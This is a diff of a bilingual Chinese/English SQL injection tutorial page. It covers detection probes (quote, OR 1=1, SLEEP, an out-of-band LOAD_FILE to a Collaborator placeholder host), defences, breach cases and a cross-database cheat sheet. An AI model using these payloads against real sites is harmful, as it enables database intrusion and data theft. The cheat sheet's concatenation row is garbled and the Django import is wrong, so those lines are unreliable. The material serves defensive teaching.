-<th><strong>方法 &#x2F; Method</strong></th>
-<th><strong>描述 &#x2F; Description</strong></th>
-<th><strong>範例 &#x2F; Example</strong></th>
+<th><strong>方法 / Method</strong></th>
+<th><strong>描述 / Description</strong></th>
+<th><strong>範例 / Example</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td><strong>單引號注入 &#x2F; Single Quote Injection</strong></td>
+<tbody>
+<tr>
+<td><strong>單引號注入 / Single Quote Injection</strong></td>
 <td>輸入單引號 <code>&#39;</code>，檢查是否返回 <strong>database error</strong>（資料庫錯誤）。</td>
 <td><code>category=&#39;</code> → 檢查錯誤訊息如「Syntax error」。</td>
 </tr>
 <tr>
-<td><strong>布林條件 &#x2F; Boolean Conditions</strong></td>
+<td><strong>布林條件 / Boolean Conditions</strong></td>
 <td>注入條件如 <code>OR 1=1</code> 或 <code>OR 1=2</code>，比較響應差異。</td>
 <td><code>category=Gifts&#39; OR 1=1--</code> → 返回所有產品。</td>
 </tr>
 <tr>
-<td><strong>時間延遲 &#x2F; Time Delays</strong></td>
+<td><strong>時間延遲 / Time Delays</strong></td>
 <td>注入延遲代碼，檢查響應時間。</td>
 <td><code>category=Gifts&#39; AND SLEEP(10)--</code> → 響應延遲 10 秒。</td>
 </tr>
 <tr>
-<td><strong>帶外技術 &#x2F; Out-of-Band Techniques</strong></td>
+<td><strong>帶外技術 / Out-of-Band Techniques</strong></td>
 <td>觸發外部網絡交互，監控結果。</td>
 <td><code>SELECT LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> → 檢查 DNS 查詢。</td>
 </tr>
 <tr>
-<td><strong>自動化工具 &#x2F; Automated Tools</strong></td>
+<td><strong>自動化工具 / Automated Tools</strong></td>
 <td>使用掃描工具快速識別漏洞。</td>
 <td>使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 或 sqlmap。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
-<h2 id="防禦-SQL-Injection-Preventing-SQL-Injection"><a href="#防禦-SQL-Injection-Preventing-SQL-Injection" class="headerlink" title="防禦 SQL Injection &#x2F; Preventing SQL Injection"></a>防禦 SQL Injection &#x2F; Preventing SQL Injection</h2><p>以下是防禦 SQLi 的最佳實踐：</p>
+<h2 id="防禦-SQL-Injection-Preventing-SQL-Injection"><a href="#防禦-SQL-Injection-Preventing-SQL-Injection" class="headerlink" title="防禦 SQL Injection / Preventing SQL Injection"></a>防禦 SQL Injection / Preventing SQL Injection</h2><p>以下是防禦 SQLi 的最佳實踐：</p>
 <ol>
-<li><p><strong>使用參數化查詢 &#x2F; Parameterized Queries</strong>：</p>
+<li><p><strong>使用參數化查詢 / Parameterized Queries</strong>：</p>
 <ul>
 <li>將用戶輸入作為參數傳遞，避免直接拼接。</li>
-<li><strong>範例（Python）</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line">cnx = mysql.connector.connect(user=<span class="string">&#x27;username&#x27;</span>, password=<span class="string">&#x27;password&#x27;</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, database=<span class="string">&#x27;mydatabase&#x27;</span>)</span><br><span class="line">cursor = cnx.cursor()</span><br><span class="line">query = <span class="string">&quot;SELECT * FROM users WHERE username = %s&quot;</span></span><br><span class="line">cursor.execute(query, (username,))</span><br><span class="line">results = cursor.fetchall()</span><br><span class="line">cursor.close()</span><br><span class="line">cnx.close()</span><br></pre></td></tr></table></figure></li>
+<li><strong>範例（Python）</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line">cnx = mysql.connector.connect(user=<span class="string">&#x27;username&#x27;</span>, password=<span class="string">&#x27;password&#x27;</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, database=<span class="string">&#x27;mydatabase&#x27;</span>)</span><br><span class="line">cursor = cnx.cursor()</span><br><span class="line">query = <span class="string">&quot;SELECT * FROM users WHERE username = %s&quot;</span></span><br><span class="line">cursor.execute(query, (username,))</span><br><span class="line">results = cursor.fetchall()</span><br><span class="line">cursor.close()</span><br><span class="line">cnx.close()</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>白名單驗證 &#x2F; Whitelisting Input Values</strong>：</p>
+<li><p><strong>白名單驗證 / Whitelisting Input Values</strong>：</p>
 <ul>
-<li>限制輸入值到允許的清單。例如：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (input.equals(<span class="string">&quot;products&quot;</span>) || input.equals(<span class="string">&quot;users&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM &quot;</span> + input;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid table name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>限制輸入值到允許的清單。例如：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (input.equals(<span class="string">&quot;products&quot;</span>) || input.equals(<span class="string">&quot;users&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM &quot;</span> + input;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid table name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>轉義用戶輸入 &#x2F; Escaping User Input</strong>：</p>
+<li><p><strong>轉義用戶輸入 / Escaping User Input</strong>：</p>
 <ul>
 <li>使用資料庫特定的轉義函數，但非首選，因易出錯。</li>
 </ul>
 </li>
-<li><p><strong>使用 ORM 框架 &#x2F; Using ORM Frameworks</strong>：</p>
+<li><p><strong>使用 ORM 框架 / Using ORM Frameworks</strong>：</p>
 <ul>
 <li>如 <a target="_blank" rel="noopener" href="https://hibernate.org/">Hibernate</a> 或 <a target="_blank" rel="noopener" href="https://www.djangoproject.com/">Django ORM</a>，自動處理查詢。</li>
-<li><strong>範例（Django）</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> User</span><br><span class="line">User.objects.<span class="built_in">filter</span>(username=<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure></li>
+<li><strong>範例（Django）</strong>：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> User</span><br><span class="line">User.objects.<span class="built_in">filter</span>(username=<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
-<li><p><strong>限制資料庫權限 &#x2F; Limiting Database Permissions</strong>：</p>
+<li><p><strong>限制資料庫權限 / Limiting Database Permissions</strong>：</p>
 <ul>
 <li>僅授予必要權限，如 <code>SELECT</code> 和 <code>INSERT</code>。</li>
 </ul>
 </li>
-<li><p><strong>部署 WAF &#x2F; Deploying Web Application Firewall</strong>：</p>
+<li><p><strong>部署 WAF / Deploying Web Application Firewall</strong>：</p>
 <ul>
 <li>使用 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/">Cloudflare</a> 等 WAF 阻止惡意請求。</li>
 </ul>
 </li>
-<li><p><strong>錯誤訊息處理 &#x2F; Error Message Handling</strong>：</p>
+<li><p><strong>錯誤訊息處理 / Error Message Handling</strong>：</p>
 <ul>
 <li>避免顯示詳細錯誤訊息，改用通用訊息如「系統錯誤，請稍後重試」。</li>
 </ul>
 </li>
-<li><p><strong>定期安全測試 &#x2F; Regular Security Testing</strong>：</p>
+<li><p><strong>定期安全測試 / Regular Security Testing</strong>：</p>
 <ul>
 <li>進行滲透測試和代碼審查，確保應用程式安全。</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h2 id="實際案例分析-Real-World-Examples"><a href="#實際案例分析-Real-World-Examples" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples"></a>實際案例分析 &#x2F; Real-World Examples</h2><p>SQLi 攻擊造成多起重大資料外洩事件：</p>
+<h2 id="實際案例分析-Real-World-Examples"><a href="#實際案例分析-Real-World-Examples" class="headerlink" title="實際案例分析 / Real-World Examples"></a>實際案例分析 / Real-World Examples</h2><p>SQLi 攻擊造成多起重大資料外洩事件：</p>
 <ul>
-<li>**Equifax (2017)**：SQLi 漏洞導致 1.47 億用戶資料被盜，損失數億美元 (<a target="_blank" rel="noopener" href="https://www.csoonline.com/article/567131/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html">Equifax Breach</a>)。</li>
-<li>**TalkTalk (2015)**：15.7 萬名客戶資料被盜，包括銀行詳情，導致聲譽損害 (<a target="_blank" rel="noopener" href="https://www.bbc.com/news/business-34639159">TalkTalk Breach</a>).</li>
-<li>**Yahoo (2013)**：數十億用戶帳號資訊被盜，部分因 SQLi (<a target="_blank" rel="noopener" href="https://www.theguardian.com/technology/2016/dec/14/yahoo-hack-third-attack-1bn-accounts-report">Yahoo Breach</a>)。</li>
+<li><strong>Equifax (2017)</strong>：SQLi 漏洞導致 1.47 億用戶資料被盜，損失數億美元 (<a target="_blank" rel="noopener" href="https://www.csoonline.com/article/567131/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html">Equifax Breach</a>)。</li>
+<li><strong>TalkTalk (2015)</strong>：15.7 萬名客戶資料被盜，包括銀行詳情，導致聲譽損害 (<a target="_blank" rel="noopener" href="https://www.bbc.com/news/business-34639159">TalkTalk Breach</a>).</li>
+<li><strong>Yahoo (2013)</strong>：數十億用戶帳號資訊被盜，部分因 SQLi (<a target="_blank" rel="noopener" href="https://www.theguardian.com/technology/2016/dec/14/yahoo-hack-third-attack-1bn-accounts-report">Yahoo Breach</a>)。</li>
 </ul>
 <p>這些案例顯示 SQLi 不僅是技術問題，還可能導致嚴重商業和法律後果。</p>
 <hr>
-<h2 id="SQL-Injection-Cheat-Sheet-SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet-SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet &#x2F; SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet &#x2F; SQL Injection Cheat Sheet</h2><p>以下是不同資料庫的常見 SQLi 語法：</p>
+<h2 id="SQL-Injection-Cheat-Sheet-SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet-SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet / SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet / SQL Injection Cheat Sheet</h2><p>以下是不同資料庫的常見 SQLi 語法：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
-<th><strong>功能 &#x2F; Function</strong></th>
+<th><strong>功能 / Function</strong></th>
 <th><strong>Oracle</strong></th>
 <th><strong>Microsoft SQL Server</strong></th>
 <th><strong>PostgreSQL</strong></th>
 <th><strong>MySQL</strong></th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>String Concatenation</strong></td>
-<td>&#96;’foo’</td>
+<td>`’foo’</td>
 <td></td>
-<td>‘bar’&#96;</td>
+<td>‘bar’`</td>
 <td><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
+<td>`’foo’</td>
+<td></td>
+<td>‘bar’`</td>
+<td><code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
 </tr>
 <tr>
 <td><strong>Comments</strong></td>
@@ -440,9 +435,11 @@
 <td><code>SELECT * FROM information_schema.tables</code></td>
 <td><code>SELECT * FROM information_schema.tables</code></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <hr>
-<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p>SQL Injection 是一種嚴重的 <strong>web security vulnerability</strong>，可能導致資料外洩、系統危害和財務損失。通過了解其運作原理、各種攻擊類型（如 <strong>Error-based</strong>、<strong>Union-based</strong>、<strong>Blind SQLi</strong> 等）以及防禦措施（如 <strong>parameterized queries</strong> 和 <strong>WAF</strong>），開發者可有效保護應用程式。對於初學者，學習 SQLi 不僅提升安全意識，還能深入理解資料庫和網頁安全原理。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，或參考 <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a> 獲取更多防護指南。</p>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 / Conclusion"></a>結論 / Conclusion</h2><p>SQL Injection 是一種嚴重的 <strong>web security vulnerability</strong>，可能導致資料外洩、系統危害和財務損失。通過了解其運作原理、各種攻擊類型（如 <strong>Error-based</strong>、<strong>Union-based</strong>、<strong>Blind SQLi</strong> 等）以及防禦措施（如 <strong>parameterized queries</strong> 和 <strong>WAF</strong>），開發者可有效保護應用程式。對於初學者，學習 SQLi 不僅提升安全意識，還能深入理解資料庫和網頁安全原理。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，或參考 <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP SQL Injection Prevention Cheat Sheet</a> 獲取更多防護指南。</p>
 <hr>
 <p><strong>Key Citations</strong>:</p>
 <ul>
@@ -548,5 +545,21 @@ MathJax.Hub.Queue(function() {
 
 
   </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
 </body>
 </html>
